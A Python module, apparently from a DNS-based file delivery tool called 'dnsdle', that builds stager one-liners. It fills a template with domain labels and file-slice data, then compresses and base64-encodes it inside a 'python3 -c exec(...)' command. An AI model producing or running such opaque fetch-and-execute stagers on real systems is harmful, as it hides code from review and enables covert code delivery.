from __future__ import absolute_import

import base64
import os
import re
import zlib

from dnsdle.stager_minify import minify
from dnsdle.stager_template import build_stager_template
from dnsdle.state import StartupError


def generate_stager(config, template, client_publish_item, target_os):
    """Generate a stager one-liner for a single client publish item.

    template is the stager template source from build_stager_template().
    client_publish_item is the mapped publish item dict for the generated
    client script.  target_os is the target platform string.

    Returns a dict with keys: source_filename, target_os, oneliner,
    minified_source.
    """

    replacements = {
        "DOMAIN_LABELS": tuple(config.domain_labels_by_domain[0]),
        "FILE_TAG": client_publish_item["file_tag"],
        "FILE_ID": client_publish_item["file_id"],
        "PUBLISH_VERSION": client_publish_item["publish_version"],
        "TOTAL_SLICES": int(client_publish_item["total_slices"]),
        "COMPRESSED_SIZE": int(client_publish_item["compressed_size"]),
        "PLAINTEXT_SHA256_HEX": client_publish_item["plaintext_sha256"],
        "SLICE_TOKENS": tuple(client_publish_item["slice_tokens"]),
        "RESPONSE_LABEL": config.response_label,
        "DNS_EDNS_SIZE": int(config.dns_edns_size),
    }

    source = template
    for key, value in replacements.items():
        source = source.replace("@@%s@@" % key, repr(value))

    unreplaced = re.search(r"@@[A-Z0-9_]+@@", source)
    if unreplaced:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "unreplaced stager template placeholder",
            {"placeholder": unreplaced.group(0)},
        )

    minified = minify(source)

    try:
        compile(minified, "<stager>", "exec")
    except SyntaxError as exc:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "minified stager source fails compilation: %s" % exc,
        )

    minified_bytes = minified.encode("ascii")
    compressed = zlib.compress(minified_bytes)
    payload = base64.b64encode(compressed)

    try:
        payload.decode("ascii")
    except (UnicodeDecodeError, ValueError):
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "base64 payload is not valid ASCII",
        )

    roundtrip = zlib.decompress(base64.b64decode(payload))
    if roundtrip != minified_bytes:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "base64/zlib round-trip verification failed",
        )

    payload_str = payload.decode("ascii")
    oneliner = (
        "python3 -c "
        '"import base64,zlib;'
        "exec(zlib.decompress(base64.b64decode('%s')))\""
        " RESOLVER PSK"
        % payload_str
    )

    return {
        "source_filename": client_publish_item["source_filename"],
        "target_os": target_os,
        "oneliner": oneliner,
        "minified_source": minified,
    }


def _stager_txt_filename(source_filename):
    """Derive the stager .txt filename from the client script filename."""
    base, _ext = os.path.splitext(source_filename)
    return base + ".stager.txt"


def _write_stager_file(managed_dir, stager):
    """Write a stager one-liner to a .txt file in the managed directory."""
    txt_name = _stager_txt_filename(stager["source_filename"])
    path = os.path.join(managed_dir, txt_name)
    temp_path = path + ".tmp"
    try:
        with open(temp_path, "wb") as handle:
            handle.write(stager["oneliner"].encode("ascii"))
            handle.write(b"\n")
        os.rename(temp_path, path)
    except Exception as exc:
        try:
            os.remove(temp_path)
        except Exception:
            pass
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "failed to write stager file: %s" % exc,
            {"path": path},
        )
    return path


def generate_stagers(config, generation_result, client_publish_items):
    """Generate stagers for all (file, target_os) pairs.

    client_publish_items is the list of mapped publish item dicts for the
    generated client scripts.

    Returns a list of stager dicts (one per artifact).
    """
    item_by_filename = {}
    for item in client_publish_items:
        item_by_filename[item["source_filename"]] = item

    template = build_stager_template()
    managed_dir = generation_result["managed_dir"]
    stagers = []
    for artifact in generation_result["artifacts"]:
        client_item = item_by_filename.get(artifact["filename"])
        if client_item is None:
            raise StartupError(
                "startup",
                "stager_generation_failed",
                "no client publish item found for artifact",
                {"filename": artifact["filename"]},
            )
        stager = generate_stager(config, template, client_item, artifact["target_os"])
        stager["path"] = _write_stager_file(managed_dir, stager)
        stagers.append(stager)

    return stagers
